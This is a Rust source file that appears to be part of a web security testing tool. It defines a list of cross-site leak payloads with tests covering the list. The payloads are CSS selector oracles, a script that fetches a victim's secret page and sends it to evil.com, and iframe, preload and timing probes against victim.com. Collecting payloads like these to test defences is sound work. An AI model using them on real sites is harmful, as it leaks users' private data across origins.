use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    payload_vec!(PayloadType::XsLeak,
        "css-oracle", [
            ("@font-face{font-family:f;src:url(//evil.com/?char=A);unicode-range:U+0041;}", "Font-based character detection A", Severity::High),
            ("@font-face{font-family:f;src:url(//evil.com/?char=B);unicode-range:U+0042;}", "Font-based character detection B", Severity::High),
            ("input[value^=\"a\"]{background:url(//evil.com/?leak)}", "Input value prefix detection", Severity::High),
            ("div:has(a[href*=\"admin\"]){background:url(//evil.com/?admin)}", "Link content detection", Severity::High),
            ("a[href*=\"token\"]{background:url(//evil.com/?token)}", "Token URL detection", Severity::High),
            ("input[name=\"search\"][value^=\"s\"]{background:url(//evil.com/?search)}", "Search query detection", Severity::High),
        ];
        "error-based", [
            ("<link rel=\"stylesheet\" href=\"https://victim.com/secret.css\">", "CSS load error (CORS)", Severity::High),
            ("<script src=\"https://victim.com/secret.js\"></script>", "JS load error (CORS)", Severity::High),
            ("<img src=\"https://victim.com/secret.png\" onerror=\"alert(1)\">", "Image load error", Severity::High),
            ("<link rel=\"prefetch\" href=\"https://victim.com/secret\">", "Prefetch error detection", Severity::Medium),
            ("<iframe src=\"https://victim.com/secret\" onload=\"/* exists */\" onerror=\"/* 404 */\"></iframe>", "Iframe error", Severity::High),
        ];
        "timing", [
            ("<link rel=\"preload\" as=\"font\" href=\"https://victim.com/font.woff2\">", "Font preload timing", Severity::Medium),
            ("<script>fetch('https://victim.com/secret').then(r=>r.json()).then(d=>fetch('//evil.com/?leak='+d))</script>", "Fetch timing", Severity::High),
            ("<img src=\"https://victim.com/secret\" onload=\"this.src='//evil.com/?loaded'\"></img>", "Image load timing", Severity::Medium),
            ("<link rel=\"stylesheet\" href=\"https://victim.com/secret.css\">", "CSS load timing", Severity::Medium),
            ("<video><source src=\"https://victim.com/secret.mp4\"></video>", "Video load timing", Severity::Medium),
        ];
        "speculation", [
            ("<link rel=\"prefetch\" href=\"https://victim.com/secret\">", "Prefetch probe", Severity::Medium),
            ("<link rel=\"preload\" href=\"https://victim.com/secret\">", "Preload probe", Severity::Medium),
            ("<script>new Image().src='https://victim.com/secret'</script>", "Image probe", Severity::Medium),
            ("<link rel=\"dns-prefetch\" href=\"//evil.com\">", "DNS prefetch probe", Severity::Low),
        ];
        "frame-counting", [
            ("<iframe src=\"https://victim.com/secret\"></iframe>", "Frame counting (onload count)", Severity::High),
            ("<iframe src=\"https://victim.com/secret\" sandbox=\"allow-same-origin\"></iframe>", "Sandboxed frame", Severity::High),
            ("<iframe src=\"https://victim.com/secret\" width=\"0\" height=\"0\" style=\"display:none\"></iframe>", "Hidden frame", Severity::High),
            ("<iframe src=\"https://victim.com/a\"></iframe><iframe src=\"https://victim.com/b\"></iframe><iframe src=\"https://victim.com/c\"></iframe>", "Multiple iframes for response time correlation", Severity::High),
            ("<iframe><iframe src=\"https://victim.com/secret\"></iframe></iframe>", "Frame nesting for CSP bypass", Severity::Critical),
        ];
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty(), "XS-Leak payloads must not be empty");
    }

    #[test]
    fn all_payloads_are_xs_leak_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::XsLeak);
        }
    }

    #[test]
    fn contains_css_oracle() {
        let payloads = get_payloads();
        let css: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.tags.contains(&"css-oracle".to_string()))
            .collect();
        assert!(css.len() >= 3, "Must contain CSS oracle payloads");
    }

    #[test]
    fn contains_error_based() {
        let payloads = get_payloads();
        let error: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.tags.contains(&"error-based".to_string()))
            .collect();
        assert!(error.len() >= 3, "Must contain error-based payloads");
    }

    #[test]
    fn contains_timing() {
        let payloads = get_payloads();
        let timing: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.tags.contains(&"timing".to_string()))
            .collect();
        assert!(timing.len() >= 3, "Must contain timing payloads");
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 15,
            "Must have substantial XS-Leak payload coverage, got {}",
            payloads.len()
        );
    }
}
